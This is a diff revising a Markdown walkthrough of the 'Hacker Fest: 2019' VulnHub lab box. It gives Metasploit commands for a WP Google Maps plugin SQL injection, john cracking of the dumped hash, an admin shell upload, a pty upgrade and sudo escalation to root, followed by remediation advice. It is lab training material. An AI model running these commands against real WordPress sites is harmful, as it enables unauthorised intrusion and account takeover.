@@ -1,124 +1,156 @@
 # Hacker Fest: 2019 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.0.20 (host-only) |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.0.20 |
 | **Difficulty** | Easy |
-| **OS** | Linux (Apache/WordPress) |
-| **Root Flag** | flag.txt in /root |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/hacker-fest-2019,405/) |
+| **OS** | Linux |
+| **Goal** | root — `/root/flag.txt` |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/hacker-fest-2019-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-nmap → WordPress → wpscan → Google Maps plugin SQLi (MSF) → hash dump → john (kittykat1) → wp_admin_shell_upload → www-data → sudo -l → sudo su → root
+Hacker Fest: 2019 is a beginner-friendly WordPress box. A vulnerable Google Maps plugin (versions 7.11.00-7.11.17) exposes an unauthenticated SQL injection endpoint through the WordPress REST API. The extracted administrator hash is cracked with rockyou, then Metasploit's authenticated shell upload module delivers a Meterpreter session. A misconfigured `sudo` rule allows the `webmaster` user to run `sudo su` without a password, giving immediate root.
 
 ## Methodology
 
-1. Network discovery and port scan
-2. WordPress enumeration with wpscan
-3. SQL injection via outdated Google Maps plugin
-4. Hash cracking with john + rockyou
-5. Admin shell upload via Metasploit
-6. Privilege escalation via sudo misconfiguration
+1. Recon — nmap reveals HTTP (80), FTP (21), SSH (22)
+2. Enumeration — WPScan identifies vulnerable Google Maps plugin
+3. Exploitation — SQLi extracts webmaster hash; John cracks it
+4. Exploitation — wp_admin_shell_upload delivers Meterpreter
+5. PrivEsc — sudo su (unrestricted sudo misconfiguration)
 
 ---
 
-## Step 1: Network Discovery
+## Step 1: Reconnaissance
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.0.0/24
+netdiscover -r 192.168.0.0/24
 nmap -A 192.168.0.20
 ```
 
-Open ports: 21 (FTP), 22 (SSH), 80 (Apache + WordPress).
-
 ![Nmap scan](images/01-nmap.png)
 
+Open ports:
+- **21/tcp** — FTP
+- **22/tcp** — SSH
+- **80/tcp** — HTTP (Apache, WordPress site)
+
 ---
 
-## Step 2: WordPress Enumeration
+## Step 2: Enumeration
+
+Browse to `http://192.168.0.20` — WordPress installation.
+
+Run WPScan to audit plugins:
 
 ```bash
-wpscan --url http://192.168.0.20/ --enumerate p
+wpscan --url http://192.168.0.20/
 ```
 
-Identifies the **WP Google Maps** plugin as outdated and vulnerable to SQL injection.
+![WPScan output](images/02-wpscan.png)
 
-![WPScan results](images/02-wpscan.png)
+Finding: **WP Google Maps plugin** is outdated (vulnerable versions 7.11.00 through 7.11.17).
+
+The plugin's REST API endpoint allows unauthenticated SQL injection.
 
 ---
 
-## Step 3: SQL Injection — Hash Extraction
+## Step 3: Exploitation — SQL Injection (Google Maps Plugin)
 
 ```bash
 msfconsole -q
-use auxiliary/admin/http/wp_google_maps_sqli
-set RHOSTS 192.168.0.20
-exploit
+msf> use auxiliary/admin/http/wp_google_maps_sqli
+msf> set RHOSTS 192.168.0.20
+msf> run
 ```
 
-Dumps WordPress user hashes. Save the `webmaster` hash to a file.
+![SQLi hash extraction](images/03-sqli-hash.png)
+
+Result: password hash for user **webmaster** extracted from the WordPress database.
+
+Save the hash and crack it:
 
 ```bash
-john --wordlist=/usr/share/wordlists/rockyou.txt hash
-# webmaster : kittykat1
+echo '<hash>' > /root/hash
+john --wordlist=/usr/share/wordlists/rockyou.txt /root/hash
+# Result: kittykat1  (webmaster)
 ```
-
-![SQLi hash dump](images/03-sqli.png)
 
 ---
 
-## Step 4: Admin Shell Upload
+## Step 4: Exploitation — Authenticated Shell Upload
+
+Use the cracked credentials to upload a PHP backdoor via the WordPress admin panel:
 
 ```bash
-use exploit/unix/webapp/wp_admin_shell_upload
-set RHOSTS 192.168.0.20
-set USERNAME webmaster
-set PASSWORD kittykat1
-exploit
+msf> use exploit/unix/webapp/wp_admin_shell_upload
+msf> set RHOSTS 192.168.0.20
+msf> set USERNAME webmaster
+msf> set PASSWORD kittykat1
+msf> exploit
 ```
 
-Meterpreter session as `www-data`.
+![Shell upload](images/04-shell-upload.png)
+
+Result: Meterpreter session as `www-data` (or `webmaster`).
+
+Upgrade to a PTY and switch to the webmaster account:
 
 ```bash
-shell
-python -c 'import pty;pty.spawn("/bin/bash")'
+meterpreter> shell
+python -c 'import pty; pty.spawn("/bin/bash")'
 su webmaster
 # Password: kittykat1
 ```
 
-![Meterpreter shell](images/04-shell.png)
+Alternative (SSH direct, no Metasploit needed):
+
+```bash
+ssh webmaster@192.168.0.20
+# Password: kittykat1
+```
 
 ---
 
-## Step 5: Privilege Escalation
+## Step 5: Privilege Escalation — sudo su
+
+Check sudo rights:
 
 ```bash
 sudo -l
-# (ALL : ALL) ALL  ← webmaster can run everything as root
+# (ALL : ALL) ALL  or equivalent unrestricted rule
+```
+
+Escalate to root:
+
+```bash
 sudo su
-id
-# uid=0(root)
+# Now root
 cd /root
+ls
 cat flag.txt
 ```
 
-![Root flag](images/05-root.png)
+![Root flag](images/05-root-flag.png)
 
 ---
 
 ## Lessons Learned
 
-1. **Outdated WordPress plugins** — WP Google Maps SQLi is a well-known CVE; keep plugins updated
-2. **Weak passwords** — `kittykat1` cracks in seconds with rockyou
-3. **Overpermissive sudo** — `(ALL:ALL) ALL` for a web user is a critical misconfiguration
-4. **WordPress admin = RCE** — once admin creds are obtained, theme/plugin editor and shell upload give instant code execution
+- WordPress plugin management is a critical attack surface — even plugins from the official directory can have severe SQLi bugs.
+- Unauthenticated REST API endpoints in WordPress plugins bypass authentication entirely; WAF rules must cover the REST namespace.
+- Password reuse: once a hash is cracked, the same credential often works across SSH, FTP, and the admin panel.
+- `sudo ALL` (or equivalent) for a web-facing account is a critical misconfiguration that trivially leads to root.
+- The box is solvable without Metasploit: SSH with cracked credentials + `sudo su`.
+
+---
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| WP Google Maps SQLi | Update plugin to current version |
-| Weak admin password | Enforce strong passwords; use a password manager |
-| sudo ALL for www-data/webmaster | Remove from sudoers; web users should have zero sudo access |
-| Admin shell upload | Disable file editing in wp-config.php: `define('DISALLOW_FILE_EDIT', true)` |
+|---|---|
+| WP Google Maps SQLi (7.11.00-7.11.17) | Update plugin to a patched version; disable unused plugins |
+| Weak password (rockyou list) | Enforce strong passwords; enable 2FA for admin accounts |
+| wp_admin_shell_upload | Disable theme/plugin file editing in wp-config.php (`DISALLOW_FILE_EDIT`) |
+| sudo ALL for webmaster | Restrict sudo to specific, necessary commands only |
